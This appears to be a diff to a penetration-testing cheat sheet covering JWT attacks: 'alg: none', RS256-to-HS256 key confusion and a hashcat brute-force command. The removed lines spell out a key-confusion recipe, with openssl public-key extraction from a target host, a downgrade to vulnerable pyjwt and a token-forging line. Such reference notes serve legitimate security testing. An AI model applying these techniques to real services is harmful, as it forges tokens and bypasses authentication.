@@ -99,13 +99,10 @@
 - signature exclusion
     - "alg": "none"
 - key confusion 
-    - change RS256 (RSA, asymmetric) to HS256 (HMAC, symmetric) and use pub key to sign
-    - 1) <pre> openssl s_client -showcerts -connect target.com:443 certs.pem && csplit -z -f 'cert' -b '%02d.pub' certs.pem '/BEGIN/' '{*}' && rm certs.pem && find . -maxdepth 1 -name "*.pub" -exec sh -c "openssl x509 -in {} -pubkey > {}.pem" \; && rm *.pub</pre>
-    - 2) ```JOSEPH``` or ```pip install pyjwt==0.4.3```
-    - 3) import jwt; print(jwt.encode({"data":"test"}, key=open("public.pem", "r").read(), algorithm="HS256"))
+    - idea: change RS256 (RSA, asymmetric) to HS256 (HMAC, symmetric) and use pub key as secret key to sign
+    - https://portswigger.net/web-security/jwt/algorithm-confusion
 - brute
     - hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a
-
 
 ### java
 - ACL bypass
